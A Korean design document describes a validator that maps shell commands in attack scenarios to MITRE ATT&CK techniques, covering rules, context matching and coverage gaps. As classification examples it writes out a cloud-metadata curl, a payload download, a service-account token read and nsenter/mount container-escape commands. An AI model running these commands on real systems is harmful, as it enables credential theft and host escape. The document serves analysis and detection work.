# Scenario Validator Level 3

이 문서는 현재 `levels/level3/` production code, 로컬 ATT&CK snapshot, JSON rule과
tests를 기준으로 작성한 구현 문서다. Level 3는 scenario가 선언한 MITRE ATT&CK
`technique_id`와 Level 2 structured evidence에서 독립적으로 만든 Action이 정적
의미상 일치하는지 판정한다.

## 1. 목적과 책임 범위

Level 3의 질문은 “현재 정적 evidence에 Technique core를 만족하는 Action과
Context가 있는가?”다. 모든 step을 Technique에 직접 연결하거나 ATT&CK description과
command 문자열의 유사도를 계산하지 않는다. 준비 단계는 supporting evidence일 수
있으며 core를 대신하지 않는다.

## 2. 전체 Pipeline

```text
Scenario technique_id
    ↓
Local ATT&CK STIX Lookup
    ↓
Level 2 Command IR / Resource / Fact
    ↓
Declarative Action Mapper
    ↓
Action + Context + Evidence
    ↓
Technique Core Patterns + Supporting Actions
    ↓
OR(patterns) / AND(requirements) / Context subset
    ↓
PASS / REVIEW / REJECT
```

`level2_output`이 주어지면 step `order`로 재사용한다. 없으면 각 step을 Level 2
`validate_shell()`로 분석한다. 합성 command와 nested invocation도 평탄화해 Action
mapping한다. Level 3는 Level 2의 최종 status를 자체 status와 자동 집계하지 않는다.

## 3. ATT&CK Provider

`AttackProvider`는 runtime network 요청 없이
`data/enterprise-attack-19.2-techniques.json`을 지연 로딩한다.

| 항목 | 값 |
|---|---|
| ATT&CK release | Enterprise ATT&CK 19.2 |
| 원본 | MITRE `attack-stix-data`의 `enterprise-attack-19.2.json` |
| 원본 commit | `6cda5ad8462c79e14fbb872f4e09059b18e0cfc4` |
| commit 날짜 | 2026-08-05 |
| 로컬 bundle 객체 | 1,350 |
| 포함 종류 | attack-pattern, x-mitre-tactic, subtechnique-of relationship |

출처, 원본/로컬 SHA-256, 필터와 라이선스는 [data/README.md](../data/README.md)와
[LICENSE.txt](../data/LICENSE.txt)에 기록되어 있다.

Provider는 external ID, tactic, sub-technique parent relationship을 실제 STIX
field로 정규화한다. `T1611`, `T1552.001` 같은 ID는 trim 후 대문자로 조회한다.
없는 ID는 `UNKNOWN_TECHNIQUE`과 REVIEW다. Deprecated/revoked는 metadata로
반환하지만 현재 최종 status를 바꾸지 않는다.

## 4. Action Vocabulary

Action은 Technique과 독립적인 저수준 행위다. 등록된 vocabulary는 다음과 같다.

| 영역 | Action |
|---|---|
| 실행 | `EXECUTE_PROGRAM`, `EXECUTE_FILE` |
| 파일 | `CREATE_FILE`, `WRITE_FILE`, `READ_FILE`, `CREATE_MEMORY_FILE`, `CHANGE_FILE_PERMISSION` |
| 연결 | `CONNECT_ENDPOINT`, `CONNECT_SOCKET` |
| namespace/mount | `CREATE_NAMESPACE`, `ENTER_NAMESPACE`, `MOUNT_FILESYSTEM` |
| process | `TRACE_PROCESS`, `WRITE_PROCESS_MEMORY`, `TERMINATE_PROCESS` |
| kernel/security | `LOAD_KERNEL_MODULE`, `LOAD_BPF_PROGRAM`, `MODIFY_SECURITY_CONTROL` |

Vocabulary 등록은 현재 mapper가 모두 emit한다는 뜻이 아니다. 실제 mapping coverage는
Technique 표와 `action_rules.json`을 함께 봐야 한다.

Action 출력:

```json
{
  "action": "ENTER_NAMESPACE",
  "context": {"namespace_type": "mount"},
  "evidence": {
    "target_pid": "1",
    "option": "-m",
    "source_fact": {
      "type": "namespace",
      "attributes": {"operation": "enter", "kind": "mount"}
    }
  }
}
```

## 5. Context Vocabulary

현재 등록된 Context key는 다음과 같다.

| 영역 | Context |
|---|---|
| program | `program_type`, `program_category`, `privilege_context` |
| file/data | `path_type`, `backing`, `file_state`, `data_type`, `credential_type`, `permission`, `transfer_source` |
| endpoint/socket | `endpoint_type`, `socket_type` |
| namespace/mount | `namespace_type`, `namespace_context`, `target_context`, `source_type` |
| operation/system | `operation`, `interface`, `process_type`, `control_type`, `module_source`, `bpf_type`, `uid_transition` |

Context에는 source evidence에서 실제 존재하는 값만 emit한다. 값이 없으면 key를
생성하지 않으며 `null`, `unknown` 또는 heuristic 값으로 채우지 않는다. Evidence는
추적 근거이며 Technique matching 조건으로 직접 사용되지 않는다.

## 6. Generic Fact-to-Action Mapping

최근 의미 mapping의 핵심은 command 이름이 아니라 Level 2 Fact schema다.

```text
Level 2 Fact
    ↓
fact type + identity/attributes/evidence subset match
    ↓
generic emit rule
    ↓
Action + existing Context + source Fact evidence
```

예를 들어 다음 rule 개념은 특정 Technique이나 `nsenter` 문자열을 참조하지 않는다.

```json
{
  "iterate": {
    "facts": {
      "type": "namespace",
      "attributes": {"operation": "enter"}
    }
  },
  "emit": {
    "action": "ENTER_NAMESPACE",
    "context": {
      "namespace_type": {"from": "iteration.fact.attributes.kind"},
      "namespace_context": {
        "from": "iteration.fact.attributes.namespace_context"
      }
    }
  }
}
```

`_fact_matches()`는 Fact의 `type`과 identity/attributes/evidence subset 및
`*_present` field를 검사한다. `iterate.facts`마다 Action을 만들고 source Fact를
evidence로 보존한다. Python에 Technique-specific command `if/elif`는 없다.

기존의 command/Resource 기반 generic rule도 함께 존재한다. 예를 들어 shell 실행,
temporary executable, `sudo`, `touch` Resource, `chmod` MODE와 `unshare`
option이 Action을 emit한다. 이들도 Technique을 직접 참조하지 않는다.

현재 Fact 기반 mapping은 다음과 같다.

| Level 2 Fact | Action | Context |
|---|---|---|
| endpoint, `class=cloud_metadata` | `CONNECT_ENDPOINT` | `endpoint_type=cloud_metadata` |
| transfer, download + source/output_path | `WRITE_FILE` | `transfer_source=external`, 선택적 path_type |
| file_access, `operation=read` | `READ_FILE` | 존재하는 data_type, credential_type, path_type |
| namespace, `operation=enter` | `ENTER_NAMESPACE` | namespace_type, 명시된 경우만 namespace_context |
| mount with source/target | `MOUNT_FILESYSTEM` | operation, source_type, 명시된 경우만 target_context |

## 7. Core와 Supporting

Technique rule의 `patterns`는 PASS에 필요한 Core다. 한 pattern의 `required`는
AND이며 여러 pattern은 OR다. `supporting_actions`는 결과에 evidence로 수집되지만
PASS 조건이 아니다.

예를 들어 T1105의 temporary file 생성/실행과 T1611의 `CREATE_NAMESPACE`는
supporting이다. Supporting만 존재하면 core match로 승격하지 않는다.

## 8. Technique Matcher

Matcher는 scenario 전체 Action을 평탄화한 뒤 다음 규칙을 적용한다.

1. 여러 pattern 중 하나가 일치하면 된다(OR).
2. 한 pattern의 모든 required Action은 일치해야 한다(AND).
3. required Context는 actual Context의 subset으로 비교한다.
4. AND requirement마다 서로 다른 Action instance를 배정한다.
5. exact pattern이 있으면 즉시 PASS하고 matched pattern과 evidence를 반환한다.
6. Supporting은 별도로 수집하며 core 결과를 변경하지 않는다.

현재 Context 값은 key별 exact equality다. Required에 없는 actual Context가 더 있어도
match에 영향을 주지 않는다.

## 9. Context Match: match / missing / conflict

Required가 `{"namespace_context": "host"}`일 때:

| Actual Context | 내부 상태 | 결과 후보 |
|---|---|---|
| `{"namespace_context":"host","namespace_type":"mount"}` | match | PASS 가능 |
| `{"namespace_type":"mount"}` | missing | `INSUFFICIENT_ACTION_CONTEXT` / REVIEW |
| `{"namespace_context":"container"}` | conflict | 다른 core가 없으면 mismatch / REJECT |

Missing은 Action type은 맞지만 필요한 증거가 없는 경우다. Conflict는 필요한 key가
존재하면서 값이 명시적으로 다른 경우다. 이 구분 때문에 보수적으로 context를
생략해도 false REJECT 대신 REVIEW가 가능하다.

## 10. 판정 정책

| 조건 / Code | 상태 | 의미 |
|---|---|---|
| exact core pattern match | PASS | 현재 structured evidence가 static core를 충족 |
| `UNKNOWN_TECHNIQUE` | REVIEW | local ATT&CK snapshot에 ID 없음 |
| `UNSUPPORTED_TECHNIQUE_RULE` | REVIEW | lookup은 됐으나 semantic rule 없음 |
| `UNMAPPED_ACTION` | REVIEW | Action 자체를 만들 근거 부족 |
| `INSUFFICIENT_ACTION_CONTEXT` | REVIEW | Action type은 맞으나 required Context missing |
| `TECHNIQUE_ACTION_MISMATCH` | REJECT | mapping된 Action/Context가 지원 core와 명시적으로 불일치 |

여러 pattern을 검사한 뒤 하나라도 missing으로 완성 가능하면
`INSUFFICIENT_ACTION_CONTEXT`가 우선한다. 그렇지 않고 step에 unmapped Action이
있으면 `UNMAPPED_ACTION`, 둘 다 아니면 `TECHNIQUE_ACTION_MISMATCH`다.

## 11. 최근 Technique 구현

### T1552.005 — Cloud Instance Metadata API

```text
curl http://169.254.169.254/latest/meta-data/
→ Level 2 endpoint Fact(class=cloud_metadata)
→ CONNECT_ENDPOINT(endpoint_type=cloud_metadata)
→ core match → PASS
```

정확한 endpoint classifier와 structured Fact를 사용한다. 일반 URL은 cloud metadata
Context를 얻지 않는다. PASS는 endpoint 접근 요청의 정적 core이지 response 수신,
credential 획득 또는 runtime network 성공의 증명이 아니다.

### T1105 — Ingress Tool Transfer

```text
curl -o /tmp/payload https://example.com/payload
→ transfer Fact(direction=download, source, output_path)
→ WRITE_FILE(transfer_source=external, path_type=temporary)
→ core match → PASS
```

현재 Fact mapper가 emit하는 core는 `WRITE_FILE`이다. Technique rule은 외부
`CREATE_FILE` 또는 `WRITE_FILE`을 OR로 허용하지만 단순
`touch /tmp/payload`의 `CREATE_FILE(path_type=temporary)`는 external source가
없어 PASS하지 않고 missing Context REVIEW가 된다. 현재 download Action은 local
output path가 명시된 `curl -o/--output` 범위다.

### T1552.001 — Credentials In Files

```text
cat /var/run/secrets/kubernetes.io/serviceaccount/token
→ file_access Fact(operation=read, data_type=credential,
  credential_type=service_account_token)
→ READ_FILE(data_type=credential)
→ core match → PASS
```

Classifier는 AWS `.aws/credentials`, `.kube/config`, exact Kubernetes
service-account token, SSH `id_rsa`/`id_ed25519` private key만 고신뢰도로
분류한다. 일반 file read도 `READ_FILE`은 되지만 `data_type=credential`이 없어
REVIEW다. filename keyword만으로 credential을 추측하지 않는다.

### T1611 — Escape to Host

Core는 다음 두 pattern의 OR이며 `CREATE_NAMESPACE`는 supporting only다.

```text
ENTER_NAMESPACE(namespace_context=host)
OR
MOUNT_FILESYSTEM(target_context=host)
```

`nsenter -t 1 -m /bin/bash`는
`ENTER_NAMESPACE(namespace_type=mount)`와 target PID evidence를 만들지만 PID 1을
host로 추측하지 않는다. 따라서 `namespace_context` missing으로 REVIEW다.
`mount --bind / /mnt/root` 또는 target `/host`도 path 이름만으로 host Context를
만들지 않아 REVIEW다. `unshare --mount`는
`CREATE_NAMESPACE(namespace_type=mount)` supporting만 생성하므로 core mismatch이며
현재 결과는 REJECT다.

신뢰 가능한 injected Fact가 `namespace_context=host` 또는
`target_context=host`를 명시하면 해당 core는 PASS한다. 명시적 `container` 값은
`host`와 conflict하여 다른 core가 없으면 REJECT다.

## 12. End-to-End 예제

### 예제 1: Cloud metadata

```text
curl metadata endpoint
→ endpoint Fact
→ CONNECT_ENDPOINT(cloud_metadata)
→ T1552.005 PASS
```

### 예제 2: Credential file

```text
cat service-account token
→ classified file_access Fact
→ READ_FILE(data_type=credential)
→ T1552.001 PASS
```

### 예제 3: 불확실한 host namespace

```text
nsenter -t 1 -m /bin/bash
→ namespace enter Fact(target_pid=1, kind=mount)
→ ENTER_NAMESPACE(namespace_type=mount)
→ namespace_context missing
→ T1611 INSUFFICIENT_ACTION_CONTEXT / REVIEW
```

## 13. Technique Coverage

아래 상태는 runtime enum이 아니라 현재 rule과 mapper coverage를 설명하는 문서용
분류다. `IMPLEMENTED`도 ATT&CK 전체 행위나 실행 성공을 증명한다는 뜻은 아니다.

| Technique | Static core rule | 현재 상태 | 주요 gap / 제한 |
|---|---|---|---|
| T1548.001 | setuid/setgid permission 또는 setuid execution | PARTIAL / STATIC_LIMITATION | chmod permission Action은 있으나 UID/EUID transition 증명 불가 |
| T1610 | container-runtime socket connection | RULE_ONLY / MAPPER_GAP | `CONNECT_SOCKET(container_runtime)` mapper 없음 |
| T1552.001 | credential file read | IMPLEMENTED (static core) | 좁은 고신뢰도 path classifier, runtime read 성공 미확인 |
| T1611 | host namespace entry 또는 host mount | PARTIAL / STATIC_LIMITATION | Action은 mapping하지만 command-only host Context를 추측하지 않음 |
| T1105 | external file create/write | PARTIAL | 현재 `curl` download + explicit output 중심 |
| T1552.005 | cloud metadata endpoint connection | PARTIAL | exact classifier 중심, response/credential 획득 미확인 |
| T1562.001 | BPF detach 또는 security-agent termination | RULE_ONLY / MAPPER_GAP | 해당 core Action mapper 없음 |
| T1620 | memory-backed file execution | RULE_ONLY / MAPPER_GAP | execution Action mapper 없음; memfd 생성만으로 충분하지 않음 |

현재 `technique_action_rules.json`의 T1552.001과 T1552.005 `limitations` 문구에는
“mapper가 아직 없다”는 이전 설명이 남아 있으나, 현재 `action_rules.json`과 tests에는
각각 `READ_FILE`, `CONNECT_ENDPOINT` Fact mapping이 구현되어 있다. 이 문서는
실행 코드와 tests의 현재 동작을 기술한다.

## 14. Static Semantic Core와 ATT&CK 전체 의미

Level 3 PASS는 현재 rule이 정의한 **정적 semantic core**가 structured evidence에
있다는 뜻이다. 다음을 뜻하지 않는다.

- 실제 command, network, namespace 또는 mount 성공
- credential 또는 payload를 실제로 획득함
- 실제 privilege escalation 또는 container escape 성공
- Technique의 모든 ATT&CK 절차와 환경 조건 충족
- scenario `goal`/`purpose` 자연어의 타당성

Rule coverage 표는 이 차이를 드러내기 위한 것이며 ATT&CK coverage 완성을 주장하지
않는다.

## 15. 현재 한계와 Level 4 경계

- raw command를 실행하지 않으며 runtime state를 관찰하지 않는다.
- kernel version/config, UID/EUID, privilege, capability, seccomp, LSM을 모른다.
- PID가 host process인지, namespace가 host와 같은지 비교하지 않는다.
- mount target이 host filesystem인지, mount가 성공했는지 확인하지 않는다.
- endpoint response, file contents, transfer 완료를 확인하지 않는다.
- command 문자열의 PID 1, `/host`, `/rootfs` 같은 이름으로 host Context를 만들지 않는다.
- `goal` 또는 step `purpose`를 NLP로 검증하지 않는다.
- Level 2 output 재사용은 현재 step `order`만 연결하며 command 동일성을 검증하지 않는다.
- Technique rule이 없는 ID는 REVIEW이며, Action evidence를 만들지 못한 경우도
  `UNMAPPED_ACTION`으로 REVIEW한다.

신뢰 가능한 host/environment context, runtime 성공, identity/capability와 kernel
조건은 Level 4 또는 외부 provider가 structured evidence로 제공해야 한다.

## 16. 주요 파일

| 파일 | 역할 |
|---|---|
| `validator.py` | ATT&CK lookup, step mapping, 최종 status 조합 |
| `providers/attack_provider.py` | local STIX Technique provider |
| `mapper/action_rule_provider.py` | Action rule schema/provider |
| `mapper/action_mapper.py` | generic command/Resource/Fact-to-Action mapping |
| `engine/technique_rule_provider.py` | Technique pattern provider |
| `engine/technique_action_validator.py` | OR/AND/context/supporting matcher |
| `rules/action_rules.json` | vocabulary와 Action mapping |
| `rules/technique_action_rules.json` | 8개 Technique core/supporting rule |
| `data/` | local Enterprise ATT&CK 19.2 snapshot과 provenance |
